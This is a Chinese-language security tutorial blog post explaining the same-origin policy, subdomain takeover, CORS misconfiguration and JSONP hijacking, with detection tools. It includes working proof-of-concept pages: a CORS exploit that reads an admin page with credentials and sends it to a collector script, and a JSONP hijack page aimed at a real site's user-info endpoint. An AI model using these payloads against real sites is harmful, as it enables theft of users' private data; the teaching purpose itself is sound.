@@ -1,0 +1,340 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+  <head>
+    
+
+    
+<script>!function(){var e=window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches,t=localStorage.getItem("use-color-scheme")||"auto";("dark"===t||e&&"light"!==t)&&document.documentElement.classList.toggle("dark",!0)}()</script>
+    
+
+<meta charset="utf-8" >
+
+<title>子域名接管 / CORS 跨域 / JSONP 回调</title>
+<meta name="keywords" content="子域名接管 / CORS 跨域 / JSONP 回调, 安全,渗透测试,应急响应,漏洞分析,安全运维">
+<meta name="description" content="
+一、前置知识：同源策略同源策略（Same-Origin Policy，SOP）是浏览器核心安全机制——限制来自一个源的文档或脚本与另一个源的资源交互。”同源”必须同时满足三个条件：
+
+同协议 + 同域名 + 同端口
+
+12345http:">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta property="og:title" content="子域名接管 / CORS 跨域 / JSONP 回调">
+<meta property="og:description" content="
+一、前置知识：同源策略同源策略（Same-Origin Policy，SOP）是浏览器核心安全机制——限制来自一个源的文档或脚本与另一个源的资源交互。”同源”必须同时满足三个条件：
+
+同协议 + 同域名 + 同端口
+
+12345http:">
+
+<link rel="shortcut icon" href="/favicon.ico">
+<link rel="stylesheet" href="/style/main.css">
+
+  <link rel="stylesheet" href="/style/simple-lightbox.min.css"><meta name="generator" content="Hexo 8.1.2"><link rel="alternate" href="/atom.xml" title="54ury" type="application/atom+xml">
+<link rel="alternate" href="/rss2.xml" title="54ury" type="application/rss+xml">
+</head>
+  <body>
+    <div id="app" class="main">
+
+<div class="site-header-container">
+  <div class="site-header">
+    <div class="left">
+      
+      
+      <a href="https://z50n6.github.io" class="no-avatar">
+        <h1 class="site-title">54ury</h1>
+      </a>
+    </div>
+    <div class="right">
+        
+        <button type="button" class="theme-switch" id="theme-switch" aria-label="切换亮色/暗色主题" title="切换主题">
+          <svg class="icon-sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" aria-hidden="true">
+            <circle cx="12" cy="12" r="4"></circle>
+            <path d="M12 2v2M12 20v2M4.9 4.9l1.4 1.4M17.7 17.7l1.4 1.4M2 12h2M20 12h2M4.9 19.1l1.4-1.4M17.7 6.3l1.4-1.4"></path>
+          </svg>
+          <svg class="icon-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+            <path d="M21 12.8A9 9 0 1 1 11.2 3a7 7 0 0 0 9.8 9.8z"></path>
+          </svg>
+        </button>
+        <i class="icon menu-switch icon-menu-outline" ></i>
+    </div>
+  </div>
+</div>
+
+<script>
+  // 手动切换亮/暗：写入 html.dark 并记忆到 use-color-scheme（与 head.ejs 的读取键一致）
+  (function () {
+    var btn = document.getElementById('theme-switch');
+    if (!btn) return;
+    btn.addEventListener('click', function () {
+      var isDark = document.documentElement.classList.toggle('dark');
+      try { localStorage.setItem('use-color-scheme', isDark ? 'dark' : 'light'); } catch (e) {}
+    });
+  })();
+</script>
+
+<div class="menu-container" style="height: 0;opacity: 0;">
+<nav class="menu-list">
+  
+    
+      <a href="/" class="menu purple-link">
+        首页
+      </a>
+    
+  
+    
+      <a href="/tags/" class="menu purple-link">
+        标签
+      </a>
+    
+  
+    
+      <a href="/categories/" class="menu purple-link">
+        分类
+      </a>
+    
+  
+    
+      <a href="/archives/" class="menu purple-link">
+        归档
+      </a>
+    
+  
+    
+      <a href="/about/" class="menu purple-link">
+        关于
+      </a>
+    
+  
+</nav>
+</div>
+
+
+
+  <div class="content-container">
+    <div class="post-detail">
+      
+      <h2 class="post-title">子域名接管 / CORS 跨域 / JSONP 回调</h2>
+      <div class="post-info post-detail-info">
+        <span><i class="icon icon-calendar-outline"></i> 2026-06-28</span>
+        
+          <span>
+          <i class="icon icon-pricetags-outline"></i>
+            
+              <a href="/tags/WEB%E6%B8%97%E9%80%8F/">
+              WEB渗透
+                
+                  ，
+                
+              </a>
+            
+              <a href="/tags/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/">
+              基础漏洞
+                
+              </a>
+            
+          </span>
+        
+      </div>
+      <div class="post-content-wrapper">
+        <div class="post-content">
+          <hr>
+<h2 id="一、前置知识：同源策略"><a href="#一、前置知识：同源策略" class="headerlink" title="一、前置知识：同源策略"></a>一、前置知识：同源策略</h2><p>同源策略（Same-Origin Policy，SOP）是浏览器核心安全机制——限制来自一个源的文档或脚本与另一个源的资源交互。”同源”必须同时满足三个条件：</p>
+<blockquote>
+<p><strong>同协议 + 同域名 + 同端口</strong></p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://www.xiaodi8.com           ← 基准</span><br><span class="line">https://www.xiaodi8.com          ← 不同源（协议不同）</span><br><span class="line">http://www.xiaodi9.com           ← 不同源（域名不同）</span><br><span class="line">http://www.xiaodi8.com:81        ← 不同源（端口不同）</span><br><span class="line">http://www.xiaodi8.com/xiaodi    ← 同源（路径不影响）</span><br></pre></td></tr></table></figure>
+
+<p>SOP 在安全上很关键，但也限制了前端功能。于是诞生了各种跨域手段——CORS、JSONP——实现不当反而引出漏洞。子域名接管则是从 DNS 层面绕过 SOP。</p>
+<p><a class="simple-lightbox" href="/imgs/subdomain-takeover-cors-jsonp/image-20240101153807552.png"><img   src="/images/loading.svg" data-src="/imgs/subdomain-takeover-cors-jsonp/image-20240101153807552.png"  alt="概念图" lazyload></a></p>
+<hr>
+<h2 id="二、子域名接管"><a href="#二、子域名接管" class="headerlink" title="二、子域名接管"></a>二、子域名接管</h2><h3 id="2-1-原理"><a href="#2-1-原理" class="headerlink" title="2.1 原理"></a>2.1 原理</h3><p>域名解析记录（CNAME、NS、MX 甚至 A 记录）指向了<strong>当前未在使用或已删除的服务</strong>。攻击者注册&#x2F;接管这个废弃目标，就获得了原域名的控制权。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">test.baidu.com CNAME → test.xxx.com（未注册/已过期）</span><br><span class="line">攻击者注册 test.xxx.com → 对 test.baidu.com 完全控制</span><br></pre></td></tr></table></figure>
+
+<p><strong>危害：</strong> 恶意软件分发、钓鱼、XSS、身份验证绕过——浏览器认为 <code>test.baidu.com</code> 是合法同源。</p>
+<h3 id="2-2-检测工具"><a href="#2-2-检测工具" class="headerlink" title="2.2 检测工具"></a>2.2 检测工具</h3><table>
+<thead>
+<tr>
+<th>工具</th>
+<th>地址</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>dnstake</td>
+<td><a target="_blank" rel="noopener" href="https://github.com/pwnesia/dnstake">https://github.com/pwnesia/dnstake</a></td>
+</tr>
+<tr>
+<td>tko-subs</td>
+<td><a target="_blank" rel="noopener" href="https://github.com/anshumanbh/tko-subs">https://github.com/anshumanbh/tko-subs</a></td>
+</tr>
+<tr>
+<td>sub404</td>
+<td><a target="_blank" rel="noopener" href="https://github.com/r3curs1v3-pr0xy/sub404">https://github.com/r3curs1v3-pr0xy/sub404</a></td>
+</tr>
+<tr>
+<td>Subdomain-Takeover</td>
+<td><a target="_blank" rel="noopener" href="https://github.com/Echocipher/Subdomain-Takeover">https://github.com/Echocipher/Subdomain-Takeover</a></td>
+</tr>
+<tr>
+<td>dnsub</td>
+<td><a target="_blank" rel="noopener" href="http://github/yunxu1/dnsub">http://github/yunxu1/dnsub</a></td>
+</tr>
+</tbody></table>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dnsub_windows_amd64.exe -d http://xiaodi8.com</span><br></pre></td></tr></table></figure>
+
+<p><a class="simple-lightbox" href="/imgs/subdomain-takeover-cors-jsonp/202204181650241197316359.png"><img   src="/images/loading.svg" data-src="/imgs/subdomain-takeover-cors-jsonp/202204181650241197316359.png"  alt="dnsub" lazyload></a></p>
+<h3 id="2-3-案例"><a href="#2-3-案例" class="headerlink" title="2.3 案例"></a>2.3 案例</h3><p><code>test.xiaodi8.com</code> CNAME 指向 <code>www.mumuxi666.com</code>，后者过期 → 攻击者注册 <code>www.mumuxi666.com</code> → 搭建钓鱼页面 → 受害者访问 <code>test.xiaodi8.com</code> 实则访问攻击者的页面。</p>
+<p><a class="simple-lightbox" href="/imgs/subdomain-takeover-cors-jsonp/202204181650241163408600.png"><img   src="/images/loading.svg" data-src="/imgs/subdomain-takeover-cors-jsonp/202204181650241163408600.png"  alt="CNAME 接管" lazyload></a></p>
+<hr>
+<h2 id="三、CORS-跨域资源共享"><a href="#三、CORS-跨域资源共享" class="headerlink" title="三、CORS 跨域资源共享"></a>三、CORS 跨域资源共享</h2><h3 id="3-1-原理"><a href="#3-1-原理" class="headerlink" title="3.1 原理"></a>3.1 原理</h3><p>CORS（Cross-Origin Resource Sharing）是 HTML5 的跨域机制，本质是<strong>放宽同源策略</strong>，允许浏览器向跨源服务器发 <code>XMLHttpRequest</code>。</p>
+<p>三个关键响应头：</p>
+<table>
+<thead>
+<tr>
+<th>响应头</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>Access-Control-Allow-Origin</code></td>
+<td>指定哪些域可访问本域资源</td>
+</tr>
+<tr>
+<td><code>Access-Control-Allow-Credentials</code></td>
+<td>设为 <code>true</code> 时允许携带 Cookie</td>
+</tr>
+<tr>
+<td><code>Access-Control-Allow-Methods</code></td>
+<td>允许哪些 HTTP 方法</td>
+</tr>
+</tbody></table>
+<p><strong>危险配置：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Allow-Origin: *               ← 任何域都能读</span><br><span class="line">Access-Control-Allow-Origin: http://evil.com ← 攻击者的域被明确允许</span><br><span class="line">+ Access-Control-Allow-Credentials: true     ← Cookie 被带上</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-2-CORS-vs-CSRF"><a href="#3-2-CORS-vs-CSRF" class="headerlink" title="3.2 CORS vs CSRF"></a>3.2 CORS vs CSRF</h3><ul>
+<li><strong>CORS</strong>：窃取资源（偷数据）——攻击者能看到受害者页面内容</li>
+<li><strong>CSRF</strong>：执行操作（改数据）——攻击者以受害者名义发请求但看不到响应</li>
+</ul>
+<h3 id="3-3-案例：敏感页面源码窃取"><a href="#3-3-案例：敏感页面源码窃取" class="headerlink" title="3.3 案例：敏感页面源码窃取"></a>3.3 案例：敏感页面源码窃取</h3><p>管理员登录后台后，访问攻击者构造的 <code>cors.html</code>：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>cors exploit<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">exploit</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> xhr1 = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> xhr2 = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span></span><br><span class="line"><span class="language-javascript">    xhr1.<span class="property">onreadystatechange</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span>(xhr1.<span class="property">readyState</span> == <span class="number">4</span> &amp;&amp; xhr1.<span class="property">status</span> == <span class="number">200</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">var</span> datas = xhr1.<span class="property">responseText</span>;</span></span><br><span class="line"><span class="language-javascript">            xhr2.<span class="title function_">open</span>(<span class="string">&quot;POST&quot;</span>, <span class="string">&quot;http://127.0.0.1:8107/cors1.php&quot;</span>, <span class="literal">true</span>);</span></span><br><span class="line"><span class="language-javascript">            xhr2.<span class="title function_">setRequestHeader</span>(<span class="string">&quot;Content-type&quot;</span>, <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">            xhr2.<span class="title function_">send</span>(<span class="string">&quot;z0=&quot;</span> + <span class="built_in">escape</span>(datas));</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    xhr1.<span class="title function_">open</span>(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;http://127.0.0.1:8107/zb_system/admin/index.php&quot;</span>, <span class="literal">true</span>);</span></span><br><span class="line"><span class="language-javascript">    xhr1.<span class="property">withCredentials</span> = <span class="literal">true</span>;</span></span><br><span class="line"><span class="language-javascript">    xhr1.<span class="title function_">send</span>();</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"><span class="title function_">exploit</span>();</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>JS 跨域读后台页面 → 内容发给 <code>cors1.php</code> 保存为 <code>secrect.html</code>：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;secrect.html&quot;</span>, <span class="string">&quot;w+&quot;</span>);</span><br><span class="line"><span class="variable">$res</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;z0&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$file</span>, <span class="variable">$res</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><a class="simple-lightbox" href="/imgs/subdomain-takeover-cors-jsonp/202204181650241117742532.png"><img   src="/images/loading.svg" data-src="/imgs/subdomain-takeover-cors-jsonp/202204181650241117742532.png"  alt="cors.html 触发" lazyload></a></p>
+<p><a class="simple-lightbox" href="/imgs/subdomain-takeover-cors-jsonp/202204181650241124517451.png"><img   src="/images/loading.svg" data-src="/imgs/subdomain-takeover-cors-jsonp/202204181650241124517451.png"  alt="泄露的后台页面源码" lazyload></a></p>
+<h3 id="3-4-检测"><a href="#3-4-检测" class="headerlink" title="3.4 检测"></a>3.4 检测</h3><p><a target="_blank" rel="noopener" href="https://github.com/chenjj/CORScanner">CORScanner</a>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install corscanner</span><br><span class="line">python cors_scan.py -i top_100_domains.txt -t 100</span><br></pre></td></tr></table></figure>
+
+<p><a class="simple-lightbox" href="/imgs/subdomain-takeover-cors-jsonp/202204181650241174345973.png"><img   src="/images/loading.svg" data-src="/imgs/subdomain-takeover-cors-jsonp/202204181650241174345973.png"  alt="CORScanner" lazyload></a></p>
+<hr>
+<h2 id="四、JSONP-跨域回调"><a href="#四、JSONP-跨域回调" class="headerlink" title="四、JSONP 跨域回调"></a>四、JSONP 跨域回调</h2><h3 id="4-1-原理"><a href="#4-1-原理" class="headerlink" title="4.1 原理"></a>4.1 原理</h3><p>JSONP（JSON with Padding）利用 <code>&lt;script&gt;</code> 标签天然可跨域加载 JS 的特性——把 JSON 数据包在回调函数里返回：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">请求：/api/getInfo?callback=handleInfo&amp;uid=xxx</span><br><span class="line">响应：handleInfo(&#123;&quot;code&quot;:200,&quot;data&quot;:&#123;...&#125;&#125;)</span><br></pre></td></tr></table></figure>
+
+<p><strong>漏洞点：</strong> 回调接口返回敏感信息，且没做 Referer 校验 → 攻击者构造页面 → 受害者访问 → 自动回调泄露信息。</p>
+<h3 id="4-2-案例：虎牙用户信息泄露"><a href="#4-2-案例：虎牙用户信息泄露" class="headerlink" title="4.2 案例：虎牙用户信息泄露"></a>4.2 案例：虎牙用户信息泄露</h3><p>登录虎牙 → 抓包找到回调接口：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://user.huya.com/user/getUserInfo?callback=jQuery17205956628992364452&amp;uid=1259515769956</span><br></pre></td></tr></table></figure>
+
+<p><a class="simple-lightbox" href="/imgs/subdomain-takeover-cors-jsonp/202204181650241133723262.png"><img   src="/images/loading.svg" data-src="/imgs/subdomain-takeover-cors-jsonp/202204181650241133723262.png"  alt="JSONP 请求" lazyload></a></p>
+<p>响应里有头像等敏感信息：</p>
+<p><a class="simple-lightbox" href="/imgs/subdomain-takeover-cors-jsonp/202204181650241146516699.png"><img   src="/images/loading.svg" data-src="/imgs/subdomain-takeover-cors-jsonp/202204181650241146516699.png"  alt="回调响应" lazyload></a></p>
+<p>构造劫持页面：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">title</span>&gt;</span>JSONP劫持<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">callbackFunction</span>(<span class="params">result</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">alert</span>(result.<span class="property">avatar</span>);</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://user.huya.com/user/getUserInfo?callback=callbackFunction&amp;uid=1259515769956&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><a class="simple-lightbox" href="/imgs/subdomain-takeover-cors-jsonp/202204181650241154687625.png"><img   src="/images/loading.svg" data-src="/imgs/subdomain-takeover-cors-jsonp/202204181650241154687625.png"  alt="JSONP 劫持成功" lazyload></a></p>
+<h3 id="4-3-检测"><a href="#4-3-检测" class="headerlink" title="4.3 检测"></a>4.3 检测</h3><p>Burp 搜索 <code>callback</code>，勾选 <code>Preserve log</code>。或使用 JSONP-Hunter 插件：</p>
+<p><a class="simple-lightbox" href="/imgs/subdomain-takeover-cors-jsonp/image-20240101152944316.png"><img   src="/images/loading.svg" data-src="/imgs/subdomain-takeover-cors-jsonp/image-20240101152944316.png"  alt="JSONP-Hunter" lazyload></a></p>
+<p><a class="simple-lightbox" href="/imgs/subdomain-takeover-cors-jsonp/202204181650241190421763.png"><img   src="/images/loading.svg" data-src="/imgs/subdomain-takeover-cors-jsonp/202204181650241190421763.png"  alt="JSONP-Hunter 收集" lazyload></a></p>
+<hr>
+<h2 id="五、三者关系"><a href="#五、三者关系" class="headerlink" title="五、三者关系"></a>五、三者关系</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">同源策略（SOP）— 浏览器安全基石</span><br><span class="line"></span><br><span class="line">  ├── 子域名接管：DNS 层面绕过 SOP，窃取合法同源身份</span><br><span class="line">  ├── CORS 配置不当：SOP 的&quot;官方后门&quot;，配错就漏数据</span><br><span class="line">  └── JSONP 回调劫持：SOP 的&quot;历史后门&quot;，用 script 标签钻空子</span><br></pre></td></tr></table></figure>
+
+<hr>
+<blockquote>
+<p><strong>一句话</strong>：这三种漏洞本质上都在挑战同源策略——子域名接管偷了身份，CORS 配错开了后门，JSONP 没校验来源跑了数据。</p>
+</blockquote>
+
+        </div>
+          
+        <div class="top-div">
+          <ol class="top-box"><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#%E4%B8%80%E3%80%81%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86%EF%BC%9A%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5"><span class="top-box-text">一、前置知识：同源策略</span></a></li><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#%E4%BA%8C%E3%80%81%E5%AD%90%E5%9F%9F%E5%90%8D%E6%8E%A5%E7%AE%A1"><span class="top-box-text">二、子域名接管</span></a><ol class="top-box-child"><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#2-1-%E5%8E%9F%E7%90%86"><span class="top-box-text">2.1 原理</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#2-2-%E6%A3%80%E6%B5%8B%E5%B7%A5%E5%85%B7"><span class="top-box-text">2.2 检测工具</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#2-3-%E6%A1%88%E4%BE%8B"><span class="top-box-text">2.3 案例</span></a></li></ol></li><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#%E4%B8%89%E3%80%81CORS-%E8%B7%A8%E5%9F%9F%E8%B5%84%E6%BA%90%E5%85%B1%E4%BA%AB"><span class="top-box-text">三、CORS 跨域资源共享</span></a><ol class="top-box-child"><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#3-1-%E5%8E%9F%E7%90%86"><span class="top-box-text">3.1 原理</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#3-2-CORS-vs-CSRF"><span class="top-box-text">3.2 CORS vs CSRF</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#3-3-%E6%A1%88%E4%BE%8B%EF%BC%9A%E6%95%8F%E6%84%9F%E9%A1%B5%E9%9D%A2%E6%BA%90%E7%A0%81%E7%AA%83%E5%8F%96"><span class="top-box-text">3.3 案例：敏感页面源码窃取</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#3-4-%E6%A3%80%E6%B5%8B"><span class="top-box-text">3.4 检测</span></a></li></ol></li><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#%E5%9B%9B%E3%80%81JSONP-%E8%B7%A8%E5%9F%9F%E5%9B%9E%E8%B0%83"><span class="top-box-text">四、JSONP 跨域回调</span></a><ol class="top-box-child"><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#4-1-%E5%8E%9F%E7%90%86"><span class="top-box-text">4.1 原理</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#4-2-%E6%A1%88%E4%BE%8B%EF%BC%9A%E8%99%8E%E7%89%99%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="top-box-text">4.2 案例：虎牙用户信息泄露</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#4-3-%E6%A3%80%E6%B5%8B"><span class="top-box-text">4.3 检测</span></a></li></ol></li><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#%E4%BA%94%E3%80%81%E4%B8%89%E8%80%85%E5%85%B3%E7%B3%BB"><span class="top-box-text">五、三者关系</span></a></li></ol>
+        </div>
+          
+      </div>
+    </div>
+
+    
+      <div class="next-post">
+        <a class="purple-link" href="/2026/06/28/ssrf/">
+          <h3 class="post-title">
+            
+            下一篇：SSRF 服务器端请求伪造
+          </h3>
+        </a>
+      </div>
+    
+  </div>
+
+
+
+
+
+
+
+<footer>
+<div class="site-footer">
+  <div class="social-container">
+    
+      
+        <a aria-label="跳转至github" href="https://github.com/z50n6" target="_blank">
+          <i class="icon icon-github"></i>
+        </a>
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+  
+    Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> <a href="https://github.com/f-dong/hexo-theme-minimalism" target="_blank">Theme</a>
+  
+  
+  
+    
+     |
+    
+      <a href="/atom.xml" target="_blank">RSS</a>
+  
+  
+  
+  
+</div>
+</footer>
+
+
+      </div>
+    </div>
+    
+<script id="hexo-configurations"> window.theme_config = {"image":{"lazyload_enable":true,"lazyload_placeholder":null,"photo_zoom":"simple-lightbox"},"search":{"enable":true,"type":"json","placeholder":"输入关键词搜索...","algolia":{"appID":"","apiKey":"","indexName":""}},"language":"zh-CN"}; window.is_post = true; </script>
+
+<script src="/js/main.js"></script>
+
+
+
+
+
+
+  <script src="/js/simple-lightbox.min.js"></script><script>document.addEventListener('DOMContentLoaded', function() {new SimpleLightbox('.post-detail .simple-lightbox', {fileExt: false,captionsData:'alt'});});</script></body>
+</html>
+
